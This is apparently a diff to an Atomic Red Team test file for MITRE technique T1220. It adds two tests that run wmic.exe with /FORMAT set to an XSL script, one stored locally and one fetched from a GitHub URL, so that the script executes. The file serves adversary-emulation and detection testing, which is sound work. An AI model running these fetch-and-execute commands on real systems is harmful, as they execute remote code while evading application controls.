@@ -40,3 +40,41 @@ atomic_tests:
     name: command_prompt
     command: |
      C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+
+- name: WMIC bypass using local XSL file
+  description: |
+    Executes the code specified within a XSL script using a local payload.
+  supported_platforms:
+    - windows
+  input_arguments:
+    wmic_command:
+      description: WMI command to execute using wmic.exe
+      type: string
+      default: process list
+    local_xsl_file:
+      description: Location of the test XSL script file on the local filesystem.
+      type: path
+      default: C:\AtomicRedTeam\atomics\T1220\src\wmic-script.xsl
+  executor:
+    name: command_prompt
+    command: |
+     wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+
+- name: WMIC bypass using remote XSL file
+  description: |
+    Executes the code specified within a XSL script using a remote payload.
+  supported_platforms:
+    - windows
+  input_arguments:
+    wmic_command:
+      description: WMI command to execute using wmic.exe
+      type: string
+      default: process list
+    remote_xsl_file:
+      description: Remote location of an XSL payload.
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmic-script.xsl
+  executor:
+    name: command_prompt
+    command: |
+     wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
